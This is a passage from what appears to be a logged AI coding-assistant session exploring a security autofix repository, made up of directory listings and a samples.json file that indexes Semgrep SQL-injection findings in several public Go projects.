th":"/Users/jonathanafek/src/autofixer/__tests__/node_modules"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/settings","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/setup","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/tests","fullSubtreeExtensionCounts":{".ts":194,".graphql":12},"numFiles":206}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"index.d.ts"},{"name":"jest.config.ts"},{"name":"package.json"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":209,".sh":1,".json":38,".fpr":8,".zip":19,".xml":3,".html":2,".graphql":20},"numFiles":300},{"absPath":"/Users/jonathanafek/src/autofixer/build","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/build/litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/clients","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/clients/cli","fullSubtreeExtensionCounts":{".mjs":15,".ts":325,".md":3,".graphql":1,".json":16,".sh":2,".java":4,".js":6,".go":1,".mod":1,".fpr":1,".gitignore":1,".png":2,"":1,".snap":1},"numFiles":380},{"absPath":"/Users/jonathanafek/src/autofixer/clients/copilot_ext","fullSubtreeExtensionCounts":{".ts":13,".sh":1,".json":3},"numFiles":17},{"absPath":"/Users/jonathanafek/src/autofixer/clients/cursor_ext","fullSubtreeExtensionCounts":{".ts":9,".sh":2,".json":4,".md":1},"numFiles":16}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".mjs":15,".ts":347,".md":4,".graphql":1,".sh":5,".json":23,".java":4,".js":6,".go":1,".mod":1,".fpr":1,".gitignore":1,".png":2,"":1,".snap":1},"numFiles":413},{"absPath":"/Users/jonathanafek/src/autofixer/consumers","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/consumers/analyzer","fullSubtreeExtensionCounts":{".py":1240,".md":156,".xml":328,"":1826,".csproj":84,".js":130,".jinja2":291,".png":126,".yml":75,".lisp":167,".sh":6,".ambr":4,".json":1738,".sql":9,".txt":17,".cs":241,".fpr":174,".http":1,".toml":1,".cfg":1,".cshtml":36,".css":7,".java":430,".xsd":3,".php":6,".jsp":8,".properties":13,".html":40,".xhtml":2,".sln":3,".yaml":4,".config":5,".aspx":4,".user":1,".go":34,".mod":12,".lock":1,".conf":1,".ini":1,".c":4,".cpp":1,".tsx":1,".ts":39,".ejs":1,".mjs":1,".cmd":1,".zip":1,".sum":2,".sqlite3":1},"numFiles":7278},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent","fullSubtreeExtensionCounts":{".ts":7,".diff":6,".inference":3,".txt":3,".json":4,".sh":1,".js":1,"":1},"numFiles":26},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/maintenance_service","fullSubtreeExtensionCounts":{".ts":55,".graphql":6,".json":9,".sh":1,".js":1,"":1},"numFiles":73},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/notifier","fullSubtreeExtensionCounts":{".ts":36,".env":1,".tsx":30,".graphql":1,".json":5,".sh":1,".js":1,"":1},"numFiles":76},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/report_init","fullSubtreeExtensionCounts":{".sh":2,".lock":1,".py":25,".conf":1,".ini":1,".md":1,".zip":1,".toml":1,"":2,".cfg":1},"numFiles":36},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser","fullSubtreeExtensionCounts":{".sh":2,".lock":1,".conf":1,".py":21,".md":1,".toml":1,"":2,".cfg":1},"numFiles":30},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scan_agent","fullSubtreeExtensionCounts":{".ts":6,".json":4,".sh":1,".js":1,".yaml":7,"":1},"numFiles":20},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scm_agent","fullSubtreeExtensionCounts":{".ts":12,".diff":5,".json":4,".sh":1,".js":1,"":1},"numFiles":24}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".py":1286,".md":158,".xml":328,"":1835,".csproj":84,".js":135,".jinja2":291,".ts":155,".env":1,".tsx":31,".png":126,".graphql":7,".yml":75,".lisp":167,".json":1764,".sh":15,".ambr":4,".sql":9,".txt":20,".cs":241,".fpr":174,".http":1,".toml":3,".cfg":3,".diff":11,".lock":3,".conf":3,".ini":2,".zip":2,".inference":3,".cshtml":36,".css":7,".yaml":11,".java":430,".xsd":3,".php":6,".jsp":8,".properties":13,".html":40,".xhtml":2,".sln":3,".config":5,".aspx":4,".user":1,".go":34,".mod":12,".c":4,".cpp":1,".ejs":1,".mjs":1,".cmd":1,".sum":2,".sqlite3":1},"numFiles":7563},{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations/node_modules"}],"childrenFiles":[{"name":"package.json"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".json":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/dist","childrenFiles":[{"name":"litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/docs","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/docs/cheat_sheets","fullSubtreeExtensionCounts":{".md":4},"numFiles":4}],"childrenFiles":[{"name":"auth.md"},{"name":"system.md"},{"name":"system.png"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".md":6,".png":1},"numFiles":7},{"absPath":"/Users/jonathanafek/src/autofixer/downloads","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/downloads/7edf2b0b78f5d9340ce0b7e6f0140614_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/a4192acfbc95ee8c4e17dca9c940da6a_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/aacc47867770f0b8078a24fe9ca384bb_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/pip"}],"childrenFiles":[{"name":"7edf2b0b78f5d9340ce0b7e6f0140614"},{"name":"a4192acfbc95ee8c4e17dca9c940da6a"},{"name":"aacc47867770f0b8078a24fe9ca384bb"},{"name":"checkmarx"},{"name":"checkmarx.lock"},{"name":"codeql"},{"name":"codeql.lock"},{"name":"dotnet-sonarscanner"},{"name":"semgrep.lock"},{"name":"sonar"},{"name":"sonarqube.lock"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/pulumi","fullSubtreeExtensionCounts":{".ts":63,".sh":3,".yaml":5,".js":4,".html":3,"":1,".json":6},"numFiles":85},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/web-workers"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":63,".sh":3,".yaml":5,".js":4,".html":3,"":1,".json":6},"numFiles":85},{"absPath":"/Users/jonathanafek/src/autofixer/migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/migrations/default","fullSubtreeExtensionCounts":{".sql":2},"numFiles":2}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sql":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/grafana","fullSubtreeExtensionCounts":{".json":3,".yaml":2},"numFiles":5},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres","fullSubtreeExtensionCounts":{".sql":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter","fullSubtreeExtensionCounts":{".yaml":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/prometheus","fullSubtreeExtensionCounts":{".yml":2},"numFiles":2}],"childrenFiles":[{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".yaml":3,".yml":2,".sql":1,".md":1,".json":3},"numFiles":10},{"absPath":"/Users/jonathanafek/src/autofixer/node_modules","childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/patchino","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/patchino/__pycache__"},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/_samples"},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/ai-playground","fullSubtreeExtensionCounts":{".ts":27,".tsx":82,".graphql":2,".css":2,".js":2,".json":5,".svg":1,".txt":1,".png":1,".ico":1,".md":1,".html":1},"numFiles":126},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/app_api","fullSubtreeExtensionCounts":{".yaml":22,".graphql":1,".sh":1,"":1,".sql":36},"numFiles":61},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/patchino","fullSubtreeExtensionCounts":{".py":32,".json":7,".txt":4,".jinja2":12,"":1},"numFiles":56},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/tests","fullSubtreeExtensionCounts":{".py":2},"numFiles":2}],"childrenFiles":[{"name":"autoflake.cfg"},{"name":"docker-compose.yml"},{"name":"example_sampler_config.json"},{"name":"Makefile"},{"name":"poetry.lock"},{"name":"precommit-format.sh"},{"name":"pyproject.toml"},{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":2,".py":34,".json":13,".lock":1,".yml":1,".md":2,".txt":5,".jinja2":12,"":3,".toml":1,".cfg":1,".ts":27,".tsx":82,".graphql":3,".css":2,".js":2,".svg":1,".png":1,".ico":1,".html":1,".yaml":22,".sql":36},"numFiles":253},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/htmlcov"},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/pycommon","fullSubtreeExtensionCounts":{".jinja2":1,".py":76,".json":1,".graphql":1},"numFiles":79},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/scripts","fullSubtreeExtensionCounts":{".py":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/tests","fullSubtreeExtensionCounts":{".ambr":1,".py":60,".json":19,".java":11,".xml":14,".fpr":3,".js":1,".yaml":1,".jsp":1},"numFiles":111}],"childrenFiles":[{"name":"autoflake.cfg"},{"name":"coverage.xml"},{"name":"hasura_schema.json"},{"name":"junit-result.xml"},{"name":"Makefile"},{"name":"poetry.lock"},{"name":"precommit-format.sh"},{"name":"ptw.ini"},{"name":"pyproject.toml"},{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":1,".lock":1,".py":137,".ini":1,".md":1,".ambr":1,".json":20,".java":11,".xml":14,".fpr":3,".js":1,".yaml":1,".jsp":1,".toml":1,".jinja2":1,".graphql":1,"":1,".cfg":1},"numFiles":198},{"absPath":"/Users/jonathanafek/src/autofixer/scripts","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/scripts/allowed-queries-generator","fullSubtreeExtensionCounts":{".ts":13,".json":2,".yaml":1,".js":6,".py":1},"numFiles":23},{"absPath":"/Users/jonathanafek/src/autofixer/scripts/analyzer","fullSubtreeExtensionCounts":{".sh":1},"numFiles":1}],"childrenFiles":[{"name":"add_issue.sh"},{"name":"add_org.sh"},{"name":"add_project.sh"},{"name":"add_user_to_project.sh"},{"name":"add_user.sh"},{"name":"check_all_services_online.py"},{"name":"check_cli_version.sh"},{"name":"cleanup_ecr.sh"},{"name":"create_api_token.sh"},{"name":"CreateToken.gql"},{"name":"deploy_broker_client.sh"},{"name":"deploy_env.sh"},{"name":"dotenv_vault_login.sh"},{"name":"download_fix_data.sh"},{"name":"extract_highlight_nodes_source.sh"},{"name":"extract_repo.sh"},{"name":"filter_ignorefiles.py"},{"name":"fix_python_codestyle.sh"},{"name":"fix_typescript_codestyle.sh"},{"name":"generate_gql_code.sh"},{"name":"generate_report.sh"},{"name":"highlight_nodes.sh"},{"name":"init.sh"},{"name":"InitOrganizationAndProject.gql"},{"name":"install_global_reqs.sh"},{"name":"install_shell_profile.sh"},{"name":"login_auth0.sh"},{"name":"opengrep_init.sh"},{"name":"optimize-vulnerability-report.sh"},{"name":"pm2_restarts.sh"},{"name":"publish_cli.sh"},{"name":"pull_env.sh"},{"name":"push_env.sh"},{"name":"python_update_lock_files.sh"},{"name":"remove_prefix.py"},{"name":"restart_failed_pr_workflows.sh"},{"name":"smart_build.sh"},{"name":"start.sh"},{"name":"test_mobb_github_action.sh"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":35,".py":4,".ts":13,".json":2,".yaml":1,".js":6,".gql":2},"numFiles":63},{"absPath":"/Users/jonathanafek/src/autofixer/services","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/services/app","fullSubtreeExtensionCounts":{".tsx":402,".ts":256,".graphql":7,".json":4,".md":5,".png":15,".gif":4,".svg":19,".js":2,".css":2,".snap":1,".env":1,"":1,".html":1,".sh":1},"numFiles":721},{"absPath":"/Users/jonathanafek/src/autofixer/services/app_api","fullSubtreeExtensionCounts":{".sh":3,".yaml":127,".graphql":1,".md":1,"":1,".sql":1135},"numFiles":1268},{"absPath":"/Users/jonathanafek/src/autofixer/services/broker","fullSubtreeExtensionCounts":{".ts":6,".toml":1,".js":2,".json":4,".graphql":1,".sh":2,"":2,".key":1,".md":1,".template":1,".crt":1},"numFiles":22},{"absPath":"/Users/jonathanafek/src/autofixer/services/datadog_postgres_agent","fullSubtreeExtensionCounts":{".yaml":2,"":1},"numFiles":3},{"absPath":"/Users/jonathanafek/src/autofixer/services/interactive_fixer","fullSubtreeExtensionCounts":{".sh":3,".lock":1,".ini":1,".py":16,".md":1,".toml":1,"":2,".cfg":1},"numFiles":26},{"absPath":"/Users/jonathanafek/src/autofixer/services/node_general_backend","fullSubtreeExtensionCounts":{".ts":99,".json":26,".fpr":4,".zip":4,".graphql":2,".sh":1,".js":2,".xml":1,".java":2,".diff":1,"":1,".txt":1},"numFiles":144},{"absPath":"/Users/jonathanafek/src/autofixer/services/rabbitmq","fullSubtreeExtensionCounts":{"":2,".conf":1},"numFiles":3}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":10,".lock":1,".ini":1,".py":16,".md":8,".toml":2,"":10,".cfg":1,".ts":361,".json":34,".fpr":4,".zip":4,".graphql":11,".js":6,".xml":1,".java":2,".diff":1,".txt":1,".yaml":129,".conf":1,".tsx":402,".png":15,".gif":4,".svg":19,".css":2,".snap":1,".env":1,".html":1,".key":1,".template":1,".crt":1,".sql":1135},"numFiles":2187},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/backend","fullSubtreeExtensionCounts":{".ts":34,".sh":1,".json":2,".graphql":2},"numFiles":39},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/components","fullSubtreeExtensionCounts":{".ts":12,".json":2,".svg":143,".js":2,".sh":1,".tsx":187},"numFiles":347},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/eslint-config-custom","fullSubtreeExtensionCounts":{".json":1,".js":1},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/frontend","fullSubtreeExtensionCounts":{".ts":1,".sh":1,".json":2},"numFiles":4},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/pulumi","fullSubtreeExtensionCounts":{".ts":5,".json":2},"numFiles":7},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/shared","fullSubtreeExtensionCounts":{".ts":14,".sh":1,".json":3},"numFiles":18},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon/tsconfig","fullSubtreeExtensionCounts":{".json":4},"numFiles":4}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":66,".json":16,".js":3,".svg":143,".sh":4,".tsx":187,".graphql":2},"numFiles":421}],"childrenFiles":[{"name":"CLAUDE.md"},{"name":"cspell.json"},{"name":"docker-bake-gha-cache.hcl"},{"name":"docker-compose.yml"},{"name":"Makefile"},{"name":"mypy_ext.ini"},{"name":"mypy.ini"},{"name":"package.json"},{"name":"pnpm-lock.yaml"},{"name":"pnpm-workspace.yaml"},{"name":"pom.xml"},{"name":"readme.md"},{"name":"static-analysis.datadog.yml"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".yaml":174,".ts":1268,".json":1928,".js":163,".svg":163,".hcl":1,"":1852,".sql":1183,".sh":77,".xml":347,".lock":6,".py":1477,".ini":6,".md":182,".ambr":5,".java":447,".gql":2,".fpr":190,".zip":26,".html":47,".tsx":702,".mjs":16,".graphql":47,".csproj":84,".jinja2":304,".env":2,".png":145,".yml":80,".lisp":167,".go":35,".mod":13,".jsp":9,".toml":7,".cfg":6,".gitignore":1,".diff":12,".txt":26,".conf":4,".snap":2,".gif":4,".css":11,".key":1,".template":1,".crt":1,".cs":241,".ico":1,".http":1,".inference":3,".cshtml":36,".xsd":3,".php":6,".properties":13,".xhtml":2,".sln":3,".config":5,".aspx":4,".user":1,".c":4,".cpp":1,".ejs":1,".cmd":1,".sum":2,".sqlite3":1},"numFiles":11553}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:01.498Z,
        "text": "Checking sample files in \`patchino/_samples\`:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:01.585Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "list_dir",
          "parameters": "{"targetDirectory":"/Users/jonathanafek/src/autofixer/patchino/_samples"}",
          "rawArguments": "{"target_directory": "/Users/jonathanafek/src/autofixer/patchino/_samples"}",
          "result": "{"directoryTreeRoot":{"absPath":"/Users/jonathanafek/src/autofixer/patchino/_samples","childrenFiles":[{"name":"12e36579cafa09e786f12c4a257ca4e7.html"},{"name":"12e36579cafa09e786f12c4a257ca4e7.pkl"},{"name":"30f70896dc317958633ad1fde6d79566.html"},{"name":"30f70896dc317958633ad1fde6d79566.pkl"},{"name":"bc90c5d567713c3a4b7f2aece525894e.html"},{"name":"bc90c5d567713c3a4b7f2aece525894e.pkl"},{"name":"bdbe6ad4a26aef8ad97db6e66adad229.html"},{"name":"bdbe6ad4a26aef8ad97db6e66adad229.pkl"},{"name":"c927321cb1cce7ad39af698943333971.html"},{"name":"c927321cb1cce7ad39af698943333971.pkl"},{"name":"d1425b8d47d7597c49881ec70f4a8b75.html"},{"name":"d1425b8d47d7597c49881ec70f4a8b75.pkl"},{"name":"d71c64f91f3745e9e6f8151d2b1f1b70.html"},{"name":"d71c64f91f3745e9e6f8151d2b1f1b70.pkl"},{"name":"samples.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".html":7,".pkl":7,".json":1},"numFiles":15}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:01.585Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json","charsLimit":100000,"effectiveUri":"file:///Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "result": "{"contents":"{\\n    \\"created_at\\": 1745851637,\\n    \\"issues\\": [\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 8,\\n            \\"issue_object_hash\\": \\"d1425b8d47d7597c49881ec70f4a8b75\\",\\n            \\"path_to_issue_object\\": \\"d1425b8d47d7597c49881ec70f4a8b75.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d1425b8d47d7597c49881ec70f4a8b75.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"30f70896dc317958633ad1fde6d79566\\",\\n            \\"path_to_issue_object\\": \\"30f70896dc317958633ad1fde6d79566.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"30f70896dc317958633ad1fde6d79566.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 32,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 31,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 27,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 30,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 29,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 12,\\n            \\"issue_object_hash\\": \\"12e36579cafa09e786f12c4a257ca4e7\\",\\n            \\"path_to_issue_object\\": \\"12e36579cafa09e786f12c4a257ca4e7.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"12e36579cafa09e786f12c4a257ca4e7.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 28,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"bc90c5d567713c3a4b7f2aece525894e\\",\\n            \\"path_to_issue_object\\": \\"bc90c5d567713c3a4b7f2aece525894e.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bc90c5d567713c3a4b7f2aece525894e.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        }\\n    ]\\n}","numCharactersInRequestedRange":7367,"totalLinesInFile":145}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:02.049Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "codebase_search",
          "parameters": "{"repositoryInfo":{"relativeWorkspacePath":".","repoName":"7297bde4-6c3c-4b5f-9f31-a615fa663f72","repoOwner":"google-oauth2|user_01JMHPT9B3D4A66MBMWNRKH8QX","orthogonalTransformSeed":3253139624173949,"preferredEmbeddingModel":"EMBEDDING_MODEL_UNSPECIFIED"},"query":"samples directory patchino _samples","topK":15,"explanation":"","codeResults":[{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":240,"column":20},"endPosition":{"line":268,"column":18}},"signatures":{}},"score":0.3773112893104553},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":170,"column":38},"endPosition":{"line":231,"column":40}},"signatures":{}},"score":0.35427165031433105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":430,"column":82},"endPosition":{"line":466,"column":19}},"signatures":{"ranges":[{"startPosition":{"line":402,"column":1},"endPosition":{"line":403,"column":5}}]}},"score":0.34733879566192627},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":399,"column":19},"endPosition":{"line":430,"column":82}},"signatures":{}},"score":0.3328891098499298},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/issue_processor.py","range":{"startPosition":{"line":227,"column":100},"endPosition":{"line":273,"column":52}},"signatures":{}},"score":0.32